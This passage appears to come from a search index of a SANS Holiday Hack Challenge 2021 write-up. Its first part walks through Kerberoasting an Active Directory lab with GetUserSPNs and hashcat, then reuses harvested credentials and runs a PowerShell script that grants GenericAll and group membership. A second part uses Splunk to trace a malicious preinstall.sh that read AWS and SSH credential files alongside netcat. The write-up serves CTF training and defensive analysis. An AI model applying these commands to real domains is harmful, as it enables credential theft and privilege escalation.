sounding shares, 'elfu_svc_shr' and 'research_dep', but of course our account does not have access to them. Screenshot","title":"Step 2: Investigate the Network"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#step-3-steal-a-hash","text":"The GetUserSPNs utility provided in SecureAuthCorp's impacket toolkit can be used to find Service Principle Names that are associated with user accounts. If one if found then the utility will request a service ticket for that SPN which will allow it to obtain the hash of the user account password. First, we download GetUsersSPNs.py from the impacket GitHub repository to our local system, then transfer it to the ElfU system using scp Local System wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py scp -P 2222 GetUserSPNs.py nrsquaxzmg@grades.elfu.org:~/ Screenshot Now on the ElfU system, run GetUserSPNs.py ElfU System python3 ./GetUserSPNs.py elfu.local/nrsquaxzmg:Zapvnxoth@ -outputfile hashes.kerberoast Screenshot We have now captured the password hash for the elfu_svc account into the file hashes.kerberoast.","title":"Step 3: Steal a Hash"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#step-4-crack-the-hash","text":"Bring the file containing the password hash for the elfu_svc account back to our local system. Local System scp -P 2222 nrsquaxzmg@grades.elfu.org:~/hashes.kerberoast ./ Screenshot Use CeWL to build a wordlist from the ElfU registration portal that we will use as a base for our password cracking attempt. Local System cewl --with-numbers https://register.elfu.org/register > wordlist.txt Now, crack the hash using the wordlist and the OneRuleToRuleThemAll rule file. Local System hashcat -m 13100 -a 0 ./hashes.kerberoast --potfile-disable -r ./OneRuleToRuleThemAll.rule --force -O wordlist.txt Screenshot","title":"Step 4: Crack the Hash"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#step-5-investigate-the-elfu_svc_shr-file-share","text":"Now that we know the password for the elfu_svc account (Snow2021!), we can use it to connect to the elfu_svc_shr file share that we found earlier. ElfU System smbclient \\\\\\\\172.17.0.3\\\\elfu_svc_shr -U elfu_svc Screenshot Looking at the files we find a lot of PowerShell scripts. Retrieve them all to our local system so we can inspect them for anything interesting. ElfU System smb: \\> prompt off smb: \\> mget *.ps1 Screenshot Now we search the files for anything that might provide us with additional access. Possible things to search for would be the strings 'password' or 'username', but neither of those got any interesting results. What does get a result is the string 'elfu.local', which is found in a single PowerShell script named 'GetProcessInfo.ps1' GetProcessInfo.ps1 $SecStringPassword = \"76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA\" $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2 , 3 , 1 , 6 , 2 , 8 , 9 , 9 , 4 , 3 , 4 , 5 , 6 , 8 , 7 , 7 $aCred = New-Object System . Management . Automation . PSCredential -ArgumentList ( \"elfu.local\\remote_elf\" , $aPass ) Invoke-Command -ComputerName 10 . 128 . 1 . 53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate This script contains encrypted authentication credentials for the account 'remote_elf' to run remote PowerShell commands against the computer with the IP address 10.128.1.53. While we do not know the password for the remote_elf account, we can use the same process that GetProcessInfo.ps1 uses to run commands of our own on the remote machine.","title":"Step 5: Investigate the elfu_svc_shr File Share"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#step-6-get-access-to-the-research_dep-share","text":"Start the Linux version of PowerShell with the pwsh command and execute the first three lines of the GetProcesssInfo.ps1 script. This will setup things so that from here forward we only have to enter the various Invoke-Command commands. Screenshot It's probably a valid assumption that the research file we are trying to access is located on the research_dep share. Access to shares is often controlled by security groups, so we use the Invoke-Command command from GetProcessInfo.ps1 with our own content for the ScriptBlock parameter to find any groups with the word 'research' in the name. ElfU System Invoke-Command -ComputerName 10 . 128 . 1 . 53 -ScriptBlock { Get-ADGroup -filter \"Name -like '*research*'\" -properties Name } -Credential $aCred -Authentication Negotiate Screenshot Now we know that there is a security group named 'Research Department'. Using the PowerShell scripts referenced in Chris Davis' KringleCon talk as a starting point we can create a script that will let us see any users that have WriteDacl rights to this group. Who_Has_WriteDacl.ps1 $ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $domainDirEntry = New-Object System . DirectoryServices . DirectoryEntry $ldapConnString $domainDirEntry . get_ObjectSecurity (). Access | Where-Object { $_ . ActiveDirectoryRights -eq 'WriteDacl' } Transfer this script to the ElfU server using scp and execute it using Invoke-Command Local System scp -P 2222 Who_Has_WriteDacl.ps1 cauovojfjy@grades.elfu.org:~/ Screenshot ElfU System Invoke-Command -ComputerName 10 . 128 . 1 . 53 -FilePath Who_Has_WriteDacl . ps1 -Credential $aCred -Authentication Negotiate Screenshot Conveniently for us, the remote_elf account has WriteDacl to this group. The next steps in the process is to give our user the GenericALL AD right to the group and then to add it to the group itself. Again, referencing the sample scripts from Chris Davis' we can write a single script to perform both operations. Grant_GenericAll_and_Add_to_Group.ps1 Add-Type -AssemblyName System . DirectoryServices $ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $username = \"cauovojfjy\" $password = \"Ufjeprxjh#\" $user = New-Object System . Security . Principal . NTAccount ( \"elfu.local\\$username\" ) $nullGUID = [guid] '00000000-0000-0000-0000-000000000000' $propGUID = [guid] '00000000-0000-0000-0000-000000000000' $sid = $user . Translate ( [System.Security.Principal.SecurityIdentifier] ) $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] :: None $ACE = New-Object System . DirectoryServices . ActiveDirectoryAccessRule $sid , ( [System.DirectoryServices.ActiveDirectoryRights] \"GenericAll\" ), ( [System.Security.AccessControl.AccessControlType] \"Allow\" ), $propGUID , $inheritanceType , $nullGUID $domainDirEntry = New-Object System . DirectoryServices . DirectoryEntry $ldapConnString $secOptions = $domainDirEntry . get_Options () $secOptions . SecurityMasks = [System.DirectoryServices.SecurityMasks] :: Dacl $domainDirEntry . RefreshCache () $domainDirEntry . get_ObjectSecurity (). AddAccessRule ( $ACE ) $domainDirEntry . CommitChanges () $domainDirEntry . dispose () $domainDirEntry = New-Object System . DirectoryServices . DirectoryEntry $ldapConnString , $username , $password $b = New-Object byte [] $sid . BinaryLength $sid . GetBinaryForm ( $b , 0 ) $hexSID = [BitConverter] :: ToString ( $b ). Replace ( '-' , '' ) $domainDirEntry . Add ( \"LDAP://<SID=$hexSID>\" ) $domainDirEntry . CommitChanges () $domainDirEntry . dispose () Again, transfer this script to the ElfU server using scp and execute it. Then, verify that our user has been added to the Research Department group. Local System scp -P 2222 Grant_GenericAll_and_Add_to_Group.ps1 cauovojfjy@grades.elfu.org:~/ ElfU System Invoke-Command -ComputerName 10 . 128 . 1 . 53 -FilePath Grant_GenericAll_and_Add_to_Group . ps1 -Credential $aCred -Authentication Negotiate Invoke-Command -ComputerName 10 . 128 . 1 . 53 -ScriptBlock { Get-ADUser -identity cauovojfjy -properties MemberOf } -Credential $aCred -Authentication Negotiate Screenshot","title":"Step 6: Get Access to the research_dep Share"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#step-7-retrieve-the-file-from-the-research_dep-share","text":"Now that we are in the Research Department security group, connect to the research_dep share. ElfU System smbclient \\\\\\\\172.17.0.3\\\\research_dep -U cauovojfjy Once connected, we find the file SantaSecretToAWonderfulHolidaySeason.pdf, so retrieve it with smb get Screenshot Finally, retrieve the file to our local system using scp and open it to find the answer to the objective. Local System scp -P 2222 cauovojfjy@grades.elfu.org:~/SantaSecretToAWonderfulHolidaySeason.pdf ./ Screenshot","title":"Step 7: Retrieve the file from the research_dep share"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#completion","text":"Answer Kindness","title":"Completion"},{"location":"objectives/O9_Splunk/","text":"Objective 9) Splunk! Difficulty : Help Angel Candysalt solve the Splunk challenge in Santa's great hall. Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you when when you complete the analysis? Hints and Resources Hints provided after helping Fitzy Shortstack and completing the Yara Analysis Terminal Challenge GitHub Monitoring in Splunk Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add , git status , and git commit . Sysmon Monitoring in Splunk Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Malicious NetCat?? Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd , for example. Elf Introduction Talk to Angel Candysalt in the Great Room Greetings North Pole visitor! I'm Angel Candysalt! A euphemism? No, that's my name. Why do people ask me that? Anywho, I'm back at Santa\u2019s Splunk terminal again this year. There's always more to learn! Take a look and see what you can find this year. With who-knows-what going on next door, it never hurts to have sharp SIEM skills! Solution Click on the Splunk terminal in the great room or use the direct link https://hhc21.bossworkshops.io/en-US/account/insecurelogin?username=user&password=kringlecon . For this challenge there are 8 tasks to be completed by executing Splunk searches and analyzing the results. For each task the included table will contain the question, Splunk searches, an analysis of the results, and the final answer. Task 1 Question Capture the commands Eddie ran most often, starting with git. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use. Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=\"*git*\" Analysis 77 results, 52 Commands Select the CommandLine field on the left bring up a window with the top 10 values and see which one has the highest count Answer git status Task 2 Question Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. The correct one! Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=\"*git*\" CommandLine=\"*partnerapi*\" Analysis 7 results Look at the process or CommandLine fields for each of the results and we find that Eddie issued the 'git remote add origin' command twice, once using the https URL https://github.com, and another using the ssh URL git@github.com. We see in later commands that he is using the ssh URL, so the ssh option is the correct one. Answer git@github.com:elfnp3/partnerapi.git Task 3 Question The 'partnerapi' project that Eddie worked on uses Docker. Gather the full docker command line that Eddie used to start the 'partnerapi' project on his workstation. Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=\"*docker*\" process_name=\"*docker*\" Analysis 36 results Going through the list there are no instances of 'docker run', or 'docker start', but there is one for 'docker compose up' (at 2:08:01.908) with a current directory of /home/eddie/partnerapi. Answer docker compose up Task 4 Question Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository. Query index=main sourcetype=github_json Analysis 27 results Select the repository.full_name field on the left to bring up a window with two repository names, including elfnp3/dvws-node. Searching github for dvws-node brings up a hit for the Damn Vulnerable Web Services repo snoopysecurity/dvws-node. This information can also be found by going to Eddie's repository at https://github.com/elfnp3/dvws-node and finding under the repository name that it was forked from snoopysecurity/dvws-node Answer https://github.com/snoopysecurity/dvws-node Task 5 Question Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation. Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=\"*npm*\" Analysis 24 results Inspecting the results we see that the command executed at 2:16:20.814 is 'node /usr/bin/npm install holiday-utils-js' Answer holiday-utils-js Task 6 Question Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious. Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 user=eddie NOT dest_ip IN (127.0.0.*) NOT dest_port IN (22,53,80,443) | stats count by dest_ip dest_port Note that this query is unchanged from the one referenced in the question Analysis This query results in a 'Smart Mode' Statistics view of 2 IP addresses. Switch the view from Smart Mode to Verbose Mode by selecting the drop down under the magnifying glass in the top right, then change the view from Statistics to Events. We now find that one of the process names is /usr/bin/nc.openbsd, which is referenced in one of the hints as having possibly malicious uses Answer /usr/bin/nc.openbsd Task 7 Question Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here. Query 1 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventId=1 process_name=\"/usr/bin/nc.openbsd\" Analysis 1 1 result The query for the previous question was looking at Network Connection events (Event Code 3), so we could not get the parent ID that was running nc.openbsd. This query though is looking at Process Creation events (Event Code 1), so we can expand the result and learn that the ParentProcessID is 6788 Query 2 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational ParentProcessId=6788 Analysis 2 2 results This query is looking at all events where the ParentProcessID is 6788. We not only see this process starting nc.openbsd, but also that it access 6 files with the command 'cat /home/eddie/.aws/credentials /home/eddie/.ssh/authorized_keys /home/eddie/.ssh/config /home/eddie/.ssh/eddie /home/eddie/.ssh/eddie.pub /home/eddie/.ssh/known_hosts' Answer 6 Task 8 Question Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address. Query 1 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventID=1 ProcessId=6788 Analysis 1 From the previous task we know that process 6788 ran both nc.openbsd and accessed a number of sensitive files. So this query looks at that process which we see is running bash. Looking into it's details we find that it's parent process ID is 6784 Query 2 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventID=1 ProcessId=6784 Analysis 2 Process 6784 also runs bash. Again, looking into it's details we find that it's parent process ID is 6783 Query 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventID=1 ProcessId=6783 Analysis 4 Here we find that process 6783 runs the command '/bin/bash preinstall.sh' Answer preinstall.sh Screenshot Completion Answer whiz Angel Candysalt Yay! You did it!","title":"9) Splunk!"},{"location":"objectives/O9_Splunk/#objective-9-splunk","text":"Difficulty : Help Angel Candysalt solve the Splunk challenge in Santa's great hall. Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you when when you complete the analysis?","title":"Objective 9) Splunk!"},{"location":"objectives/O9_Splunk/#hints-and-resources","text":"Hints provided after helping Fitzy Shortstack and completing the Yara Analysis Terminal Challenge GitHub Monitoring in Splunk Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add , git status , and git commit . Sysmon Monitoring in Splunk Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Malicious NetCat?? Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd , for example.","title":"Hints and Resources"},{"location":"objectives/O9_Splunk/#elf-introduction","text":"Talk to Angel Candysalt in the Great Room Greetings North Pole visitor! I'm Angel Candysalt! A euphemism? No, that's my name. Why do people ask me that? Anywho, I'm back at Santa\u2019s Splunk terminal again this year. There's always more to learn! Take a look and see what you can find this year. With who-knows-what going on next door, it never hurts to have sharp SIEM skills!","title":"Elf Introduction"},{"location":"objectives/O9_Splunk/#solution","text":"Click on the Splunk terminal in the great room or use the direct link https://hhc21.bossworkshops.io/en-US/account/insecurelogin?username=user&password=kringlecon . For this challenge there are 8 tasks to be completed by executing Splunk searches and analyzing the results. For each task the included table will contain the question, Splunk searches, an analysis of the results, and the final answer.","title":"Solution"},{"location":"objectives/O9_Splunk/#task-1","text":"Question Capture the commands Eddie ran most often, starting with git. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use. Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=\"*git*\" Analysis 77 results, 52 Commands Select the CommandLine field on the left bring up a window with the top 10 values and see which one has the highest count Answer git status","title":"Task 1"},{"location":"objectives/O9_Splunk/#task-2","text":"Question Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. The correct one! Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=\"*git*\" CommandLine=\"*partnerapi*\" Analysis 7 results Look at the process or CommandLine fields for each of the results and we find that Eddie issued the 'git remote add origin' command twice, once using the https URL https://github.com, and another using the ssh URL git@github.com. We see in later commands that he is using the ssh URL, so the ssh option is the correct one. Answer git@github.com:elfnp3/partnerapi.git","title":"Task 2"},{"location":"objectives/O9_Splunk/#task-3","text":"Question The 'partnerapi' project that Eddie worked on uses Docker. Gather the full docker command line that Eddie used to start the 'partnerapi' project on his workstation. Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=\"*docker*\" process_name=\"*docker*\" Analysis 36 results Going through the list there are no instances of 'docker run', or 'docker start', but there is one for 'docker compose up' (at 2:08:01.908) with a current directory of /home/eddie/partnerapi. Answer docker compose up","title":"Task 3"},{"location":"objectives/O9_Splunk/#task-4","text":"Question Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository. Query index=main sourcetype=github_json Analysis 27 results Select the repository.full_name field on the left to bring up a window with two repository names, including elfnp3/dvws-node. Searching github for dvws-node brings up a hit for the Damn Vulnerable Web Services repo snoopysecurity/dvws-node. This information can also be found by going to Eddie's repository at https://github.com/elfnp3/dvws-node and finding under the repository name that it was forked from snoopysecurity/dvws-node Answer https://github.com/snoopysecurity/dvws-node","title":"Task 4"},{"location":"objectives/O9_Splunk/#task-5","text":"Question Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation. Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine=\"*npm*\" Analysis 24 results Inspecting the results we see that the command executed at 2:16:20.814 is 'node /usr/bin/npm install holiday-utils-js' Answer holiday-utils-js","title":"Task 5"},{"location":"objectives/O9_Splunk/#task-6","text":"Question Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious. Query index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 user=eddie NOT dest_ip IN (127.0.0.*) NOT dest_port IN (22,53,80,443) | stats count by dest_ip dest_port Note that this query is unchanged from the one referenced in the question Analysis This query results in a 'Smart Mode' Statistics view of 2 IP addresses. Switch the view from Smart Mode to Verbose Mode by selecting the drop down under the magnifying glass in the top right, then change the view from Statistics to Events. We now find that one of the process names is /usr/bin/nc.openbsd, which is referenced in one of the hints as having possibly malicious uses Answer /usr/bin/nc.openbsd","title":"Task 6"},{"location":"objectives/O9_Splunk/#task-7","text":"Question Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here. Query 1 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventId=1 process_name=\"/usr/bin/nc.openbsd\" Analysis 1 1 result The query for the previous question was looking at Network Connection events (Event Code 3), so we could not get the parent ID that was running nc.openbsd. This query though is looking at Process Creation events (Event Code 1), so we can expand the result and learn that the ParentProcessID is 6788 Query 2 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational ParentProcessId=6788 Analysis 2 2 results This query is looking at all events where the ParentProcessID is 6788. We not only see this process starting nc.openbsd, but also that it access 6 files with the command 'cat /home/eddie/.aws/credentials /home/eddie/.ssh/authorized_keys /home/eddie/.ssh/config /home/eddie/.ssh/eddie /home/eddie/.ssh/eddie.pub /home/eddie/.ssh/known_hosts' Answer 6","title":"Task 7"},{"location":"objectives/O9_Splunk/#task-8","text":"Question Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address. Query 1 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventID=1 ProcessId=6788 Analysis 1 From the previous task we know that process 6788 ran both nc.openbsd and accessed a number of sensitive files. So this query looks at that process which we see is running bash. Looking into it's details we find that it's parent process ID is 6784 Query 2 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventID=1 ProcessId=6784 Analysis 2 Process 6784 also runs bash. Again, looking into it's details we find that it's parent process ID is 6783 Query 4 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventID=1 ProcessId=6783 Analysis 4 Here we find that process 6783 runs the command '/bin/bash preinstall.sh' Answer preinstall.sh Screenshot","title":"Task 8"},{"location":"objectives/O9_Splunk/#completion","text":"Answer whiz Angel Candysalt Yay! You did it!","title":"Completion"}]}